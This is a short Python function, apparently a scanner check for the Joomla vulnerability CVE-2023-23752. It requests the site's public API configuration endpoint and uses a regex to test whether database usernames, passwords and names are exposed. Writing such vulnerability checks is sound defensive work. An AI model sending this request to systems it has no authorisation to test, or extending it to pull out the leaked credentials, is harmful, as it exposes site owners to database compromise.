import requests
import logging
import re


# CVE-2023-23752 - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23752

def joomla_unauthorized_access(url: str, verify: bool = True, timeout: int | float = 10) -> bool:

    regex = re.compile(r'"user":"(.*?)".*?"password":"(.*?)".*?"db":"(.*?)"')
    
    try:
        target_url = url + "/api/index.php/v1/config/application?public=true"
        response = requests.get(target_url, verify=verify, timeout=timeout)
    
        if response.status_code == 200:
            mtch = regex.search(response.text)
    
            if mtch:
                return True
    
            else:
                return False
    
        else:
            return False
    
    except Exception as e:
        logging.error(e)